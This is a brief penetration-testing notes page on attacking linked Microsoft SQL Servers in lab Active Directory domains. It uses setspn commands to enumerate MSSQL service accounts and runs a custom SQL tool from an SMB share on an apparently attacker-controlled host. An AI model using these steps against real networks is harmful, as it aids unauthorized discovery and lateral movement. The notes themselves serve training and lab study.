# Linked SQL Servers

## Enumeration

```powershell
# Locating MSSQL servers in PROD.CORP1.COM
setspn -T prod -Q MSSQLSvc/*
# Locating MSSQL servers in CORP1.COM
setspn -T corp1 -Q MSSQLSvc/*
# Locating MSSQL servers in CORP2.COM
setspn -T corp2.com -Q MSSQLSvc/*
```

## Exploitation

{% code overflow="wrap" %}
```powershell
# Authentication to MSSQL server on DC01.CORP2.COM (Update SQL to point to the new server)
\\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe

```
{% endcode %}
